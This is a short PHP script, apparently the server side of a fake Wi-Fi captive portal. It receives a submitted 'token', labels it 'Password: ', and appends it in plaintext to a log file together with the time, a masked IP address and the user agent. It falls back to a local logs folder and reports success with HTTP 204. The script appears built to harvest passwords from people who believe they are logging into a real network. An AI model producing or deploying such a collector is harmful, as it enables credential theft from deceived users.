<?php
function sanitize($s) {
  $s = trim($s ?? '');
  if (function_exists('mb_substr')) {
    $s = mb_substr($s, 0, 100, 'UTF-8');
  } else {
    $s = substr($s, 0, 100);
  }
  return preg_replace('/[^A-Za-z0-9\-\._ ]/u', '', $s);
}
function norm_ip($ip) {
  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    $p = explode('.', $ip); $p[3] = '0'; return implode('.', $p);
  }
  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    return preg_replace('/:[0-9a-fA-F]{0,4}$/', ':0000', $ip);
  }
  return '0.0.0.0';
}

$token = sanitize($_POST['token'] ?? '');
if ($token === '') { http_response_code(400); exit; }

$ip   = norm_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
$ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
$when = gmdate('c');
$line = json_encode(['Time: '=>$when,'IP Address: '=>$ip,'User-Agent: '=>$ua,'Password: '=>$token], JSON_UNESCAPED_UNICODE) . PHP_EOL;

$primary = '/var/log/ca.log';
$fallbackDir  = __DIR__ . '/logs';
$fallbackFile = $fallbackDir . '/ca.log';
if (!is_dir($fallbackDir)) { @mkdir($fallbackDir, 0700, true); }

$ok = false;

if (@is_writable($primary) || (!file_exists($primary) && @is_writable(dirname($primary)))) {
  if ($fh = @fopen($primary, 'ab')) { @fwrite($fh, $line); @fclose($fh); $ok = true; }
}

if (!$ok) {
  if ($fh2 = @fopen($fallbackFile, 'ab')) { @fwrite($fh2, $line); @fclose($fh2); $ok = true; }
}

if (!$ok) {
  error_log("fuck");
  http_response_code(500);
  exit;
}

error_log("captive-portal: $line"); 
http_response_code(204);
exit;
